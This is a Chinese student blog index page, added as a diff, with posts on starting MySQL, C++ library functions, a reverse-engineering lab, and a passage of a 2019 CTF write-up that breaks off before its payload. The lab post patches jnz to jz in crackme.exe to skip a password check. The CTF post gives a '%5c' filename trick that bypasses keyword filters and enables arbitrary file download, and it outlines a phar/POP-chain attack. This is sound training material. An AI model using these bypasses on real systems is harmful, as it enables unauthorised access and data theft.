@@ -1,0 +1,1550 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>iHui</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="iHui">
+<meta property="og:url" content="http://example.com/page/6/index.html">
+<meta property="og:site_name" content="iHui">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="iHui">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="iHui" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">iHui</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-MySQL服务启动" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/21/MySQL%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/" class="article-date">
+  <time class="dt-published" datetime="2019-10-21T08:29:48.000Z" itemprop="datePublished">2019-10-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/MySQL/">MySQL</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/21/MySQL%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/">MySQL服务启动</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>今天舍友让我给他演示一下MySQL数据库的使用，前几天我不知道安装了什么软件，结果电脑感觉出了问题，连基本的ping命令都不能用了，所以就恢复系统，又查了一下网上的各种经验，终于搞定了♪(^∇^*)♪(^∇^*)</p>
+<h1 id="2-方法一"><a href="#2-方法一" class="headerlink" title="2 方法一"></a>2 方法一</h1><p>如图1所示，在桌面找到此电脑，右键点击<font color=red>管理</font></p>
+<p><img src="https://img-blog.csdnimg.cn/20210303192416349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图1  找到管理"></p>
+<p>如图2所示，首先点击<font color=red>服务</font>，然后右键<font color=red>MySQL80</font>，并点击<font color=red>启动</font>，即可启动MySQL服务。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210303192818311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图2 开启MySQL服务"></p>
+<p>【注】你的可能不是<font color=red>MySQL80</font>，但开头只要是<font color=red>MySQL</font>即可。</p>
+<h1 id="3-方法二"><a href="#3-方法二" class="headerlink" title="3 方法二"></a>3 方法二</h1><ol>
+<li>必须以管理员身份运行DOS，不然会提示服务名无效</li>
+<li>必须进入到安装MySQL时的bin文件夹，里面还有个mysql.exe文件</li>
+<li>在上述步骤的基础上，再运行命令<code>net start mysql80</code></li>
+</ol>
+<p>即可打开MySQL服务，进而可以使用sql语句通过MySQLWorkbench对数据库中数据进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/20210303193315418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图3 DOS开启MySQL服务"></p>
+<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>数据库还是大二下半学期学的啊，现在才大三上半学期，都快忘了，在学习新知识的基础上，还是得不断复习以前学过的内容啊！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/21/MySQL%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8/" data-id="cl1qb1dye003yqktufqad4j08" data-title="MySQL服务启动" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-C++常用库函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/21/C++%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0/" class="article-date">
+  <time class="dt-published" datetime="2019-10-20T16:48:43.000Z" itemprop="datePublished">2019-10-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Cpp/">Cpp</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/21/C++%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0/">C++常用库函数</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>明天就要数据结构实验考试了，这两天疯狂复习总结一下C++常用的库函数，以便到时候能飘过……</p>
+<h1 id="2-常用数学函数"><a href="#2-常用数学函数" class="headerlink" title="2 常用数学函数"></a>2 常用数学函数</h1><blockquote>
+<p>头文件 #include &lt; math&gt; 或者 #include &lt;math.h&gt;</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>int abs(int x)</td>
+<td>求整数x的绝对值</td>
+<td>绝对值</td>
+</tr>
+<tr>
+<td>double fabs(double x)</td>
+<td>求实数x的绝对值</td>
+<td>绝对值</td>
+</tr>
+<tr>
+<td>long labs(long x)</td>
+<td>求长整数x的绝对值</td>
+<td>绝对值</td>
+</tr>
+<tr>
+<td>double sin(double x)</td>
+<td>计算sin(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double cos(double x)</td>
+<td>计算cos(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double tan(double x)</td>
+<td>计算tan(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double asin(double x)</td>
+<td>计算arsin(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double acos(double x)</td>
+<td>计算arcos(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double atan(double x)</td>
+<td>计算artan(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double log(double x)</td>
+<td>计算ln(x)的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double log10(double x)</td>
+<td>计算以10为底x的对数的值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double sqrt(double x)</td>
+<td>计算x的平方值</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td>double pow(double x, double y)</td>
+<td>求x的y次幂的值</td>
+<td>计算结果</td>
+</tr>
+</tbody></table>
+<h1 id="3-其他常用函数"><a href="#3-其他常用函数" class="headerlink" title="3 其他常用函数"></a>3 其他常用函数</h1><blockquote>
+<p>头文件#include &lt; stdlib&gt; 或者 #include &lt;stdlib.h&gt;</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>函数原型</th>
+<th>功能</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>double atof(const char *s)</td>
+<td>将s所指向的字符串转换成实数</td>
+<td>实数值</td>
+</tr>
+<tr>
+<td>int atoi(const char *s)</td>
+<td>将s所指向的字符串转换成整数值</td>
+<td>整数值</td>
+</tr>
+<tr>
+<td>long atol(const char *s)</td>
+<td>将s所指的字符串转换成长整数</td>
+<td>长整数值</td>
+</tr>
+<tr>
+<td>int rand(void)</td>
+<td>产生一个随机整数</td>
+<td>随机整数</td>
+</tr>
+<tr>
+<td>max(a, b)</td>
+<td>求两个数中的大数</td>
+<td>大数</td>
+</tr>
+<tr>
+<td>min(a, b)</td>
+<td>求两个数中的小数</td>
+<td>小数</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>头文件#include &lt; complex&gt; 或者 #include &lt;complex.h&gt;</p>
+</blockquote>
+<p>实例代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;complex&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// 复数类对象定义</span><br><span class="line">	cout &lt;&lt; &quot;复数类对象定义&quot; &lt;&lt; endl;</span><br><span class="line">	double r = 1.0;</span><br><span class="line">	double x = 1.0;</span><br><span class="line">	complex&lt;double&gt; c1;</span><br><span class="line">	complex&lt;double&gt; c2(1,1);</span><br><span class="line">	complex&lt;double&gt; c3(r,x);</span><br><span class="line">	complex&lt;double&gt; c4 = 2.0;</span><br><span class="line">	complex&lt;double&gt; c5 = c4 + complex&lt;double&gt;(2,1);</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; &quot;c1 = &quot; &lt;&lt; c1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c2 = &quot; &lt;&lt; c2 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c3 = &quot; &lt;&lt; c3 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c4 = &quot; &lt;&lt; c4 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5 = &quot; &lt;&lt; c5 &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	// 笛卡尔坐标系和极坐标系下有关函数</span><br><span class="line">	cout &lt;&lt; &quot;笛卡尔坐标系和极坐标系下有关函数&quot; &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5实部real：&quot; &lt;&lt; c5.real() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5虚部imag：&quot; &lt;&lt; c5.imag() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5模值abs：&quot; &lt;&lt; abs(c5) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5模值平方norm：&quot; &lt;&lt; norm(c5) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5幅角arg：&quot; &lt;&lt; arg(c5) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c5共轭复数conj：&quot; &lt;&lt; conj(c5) &lt;&lt; endl;</span><br><span class="line">	complex&lt;double&gt; z = polar(1.0, 3.14/6);</span><br><span class="line">	cout &lt;&lt; &quot;复数极坐标定义polar：&quot; &lt;&lt; z &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	// 运算符重载，四则运算</span><br><span class="line">	cout &lt;&lt; &quot;运算符重载，四则运算&quot; &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c2 + c5 = &quot; &lt;&lt; c2 + c5 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c2 - c5 = &quot; &lt;&lt; c2 - c5 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c2 * c5 = &quot; &lt;&lt; c2 * c5 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; &quot;c2 / c5 = &quot; &lt;&lt; c2 / c5 &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<p><img src="https://img-blog.csdnimg.cn/20191022151131653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="复数及其运算"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/21/C++%E5%B8%B8%E7%94%A8%E5%BA%93%E5%87%BD%E6%95%B0/" data-id="cl1qb1dx4000nqktu2o05axnq" data-title="C++常用库函数" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Reverse" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/20/Reverse/" class="article-date">
+  <time class="dt-published" datetime="2019-10-20T10:14:43.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/20/Reverse/">Reverse</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>前几天网安老师给我们几个留了个作业，让我们进行Reverse实验，因为没接触过，这次就随便做做就行，随遇而安……</p>
+<h2 id="1-1-crackme"><a href="#1-1-crackme" class="headerlink" title="1.1 crackme"></a>1.1 crackme</h2><p>在crackme.c文件中，我发现这是一个验证合法用户身份的c语音，只有用户输入1234567时才会通过验证，其他输入都不能通过验证。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020181712689.png" alt="图1 验证登录"></p>
+<p>在IDA中打开crackme.exe，将此处的jnz改为jz即可</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020181745988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图2 程序修改位置"></p>
+<p>在UltraEdit中打开crackme.exe，在1130行将jnz对应的16进制数改为jz对应的16进制数并保存</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020181823584.png" alt="图3 修改为jz"></p>
+<p>结果发现，crackme.exe直接运行结束，跳过了输入口令的步骤</p>
+<h2 id="1-2-overflow，overflow2，overflow3"><a href="#1-2-overflow，overflow2，overflow3" class="headerlink" title="1.2 overflow，overflow2，overflow3"></a>1.2 overflow，overflow2，overflow3</h2><p>在crackme.c文件中，我发现这一段代码和上面做的crackme的C代码一样，我们可以通过输入qqqqqqqq或者222222222222222222来使栈溢出而绕过验证，至于原理我也说不清楚，因为我不太喜欢逆向，个人在ctf题目中都是做Web题目。</p>
+<h2 id="1-3-Reverse题目的wp"><a href="#1-3-Reverse题目的wp" class="headerlink" title="1.3 Reverse题目的wp"></a>1.3 Reverse题目的wp</h2><p>这是个二进制程序，首先用IDA打开，查看流程，发现这是32位ELF文件。本题为入门题，可以直接使用IDA的F5功能，查看程序流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char flag[29]; // [esp+Bh] [ebp-2Dh]</span><br><span class="line">  int n; // [esp+28h] [ebp-10h]</span><br><span class="line">  int i; // [esp+2Ch] [ebp-Ch]</span><br><span class="line">  *(_DWORD *)flag = 0xC881E8F1;</span><br><span class="line">  *(_DWORD *)&amp;flag[4] = 0xCECF81D2;</span><br><span class="line">  *(_DWORD *)&amp;flag[8] = 0x81C081D5;</span><br><span class="line">  *(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;</span><br><span class="line">  *(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;</span><br><span class="line">  *(_DWORD *)&amp;flag[20] = 0xCCD4CF81;</span><br><span class="line">  *(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;</span><br><span class="line">  flag[28] = 0;</span><br><span class="line">  printf(&quot;What is magic number? &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">  if ( n == 0x12B9B0A1 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; flag[i]; ++i )</span><br><span class="line">      flag[i] ^= n;</span><br><span class="line">    printf(&quot;Flag is FLAG&#123;%s&#125;\n&quot;, flag);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Try Hard.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出程序首先要求输入一个数n，然后跟数值0x12B9B0A1比较，如果相等，则对flag数组的每一个元素（字节）与n进行XOR运算，就可以得到flag（需要注意的是因为flag数组的每个元素为一个字节，所以虽然与n进行XOR，实际起作用的只有n的低位字节，即0xA1）。<br>所以只需要写一个脚本完成这个过程即可，我们使用Python完成该部分脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack</span><br><span class="line">a = [0xC881E8F1,  #可以看出是flag经过XOR异或加密得到的密文</span><br><span class="line">0xCECF81D2,</span><br><span class="line">0x81C081D5,</span><br><span class="line">0xC8D5C0D3,</span><br><span class="line">0xCDC0CFCE,</span><br><span class="line">0xCCD4CF81,</span><br><span class="line">0x8FD3C4C3]</span><br><span class="line">t = &quot;&quot;</span><br><span class="line">for i in a:</span><br><span class="line">    t += pack(&quot;&lt;I&quot;,i).decode(&#x27;ISO-8859-1&#x27;)</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(len(t)):</span><br><span class="line">    flag += chr(ord(t[i])^0xa1)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-总结"><a href="#2-总结" class="headerlink" title="2 总结"></a>2 总结</h1><p>这次作业有点难为我了，在平常的CTF比赛中，我都是捡着Web和Misc的题目来做，逆向这一类的题目我是一题都没做过，所以说我就把上课听懂的内容复现了，剩下的三个overflow都没做，但内容又感觉太少了，所以就又写了一道hackme中的逆向题helloworld。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/20/Reverse/" data-id="cl1qb1dyd003uqktuh5bz8r5h" data-title="Reverse" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019巅峰极客-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/19/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-wp/" class="article-date">
+  <time class="dt-published" datetime="2019-10-19T01:00:00.000Z" itemprop="datePublished">2019-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/19/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-wp/">2019巅峰极客-wp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>将题目下载下来后是一个zip压缩包，解压后是一个PE程序 签到.exe，由于本人较菜，不会用IDA获得flag，于是就采用了笨方法，等了一段时间，flag已终于出来了。</p>
+<p><img src="https://img-blog.csdnimg.cn/2019101913421034.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><h3 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h3><p>1 随便点击可以发现题目泄露了如下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line">if (isset($name))&#123;</span><br><span class="line">    if (preg_match(&#x27;/\.|etc|var|tmp|usr/i&#x27;, $url))&#123;</span><br><span class="line">        echo(&quot;hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        if (preg_match(&#x27;/base|class|file|function|index|upload_file/i&#x27;, $name))&#123;</span><br><span class="line">            echo (&quot;hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $name = safe_replace($name);</span><br><span class="line">            if (preg_match(&#x27;/base|class|file|function|index|upload_file/i&#x27;, $name))&#123;</span><br><span class="line">                $filename = $name.&#x27;.php&#x27;;</span><br><span class="line">                $dir =&quot;./&quot;;</span><br><span class="line">                $down_host = $_SERVER[&#x27;HTTP_HOST&#x27;].&#x27;/&#x27;;</span><br><span class="line">                if(file_exists(__DIR__.&#x27;/&#x27;.$dir.$filename))&#123;</span><br><span class="line">                    $file = fopen ( $dir.$filename, &quot;rb&quot; );</span><br><span class="line">                    Header ( &quot;Content-type: application/octet-stream&quot; );</span><br><span class="line">                    Header ( &quot;Accept-Ranges: bytes&quot; );</span><br><span class="line">                    Header ( &quot;Accept-Length: &quot; . filesize ( $dir.$filename ) );</span><br><span class="line">                    Header ( &quot;Content-Disposition: attachment; filename=&quot; . $filename );</span><br><span class="line">                    echo fread ( $file, filesize ( $dir . $filename ) );</span><br><span class="line">                    fclose ( $file );</span><br><span class="line">                    exit ();</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo (&quot;file doesn&#x27;t exist.&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (preg_match(&#x27;/flag/i&#x27;, $name))&#123;</span><br><span class="line">                echo (&quot;hacker!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2 审计可以发现是个任意下载的点，代码对其项目的文件名做了过滤，需要第一次不满足，第二次满足，那么问题问题肯定出在<code>safe_replace</code>，fuzz一下可以发现这个函数把%5c置为空。那么就用形如<code>inde%5cx</code>的形式把文件下下来。</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020115412500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>3 审计一下可以发现是个phar+pop链的套路题，phar的触发点在file.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020115429154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<p>4 pop链的构造在show.php，gadget依次为<code>__destruct-&gt;__call-&gt;__toString</code><br>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 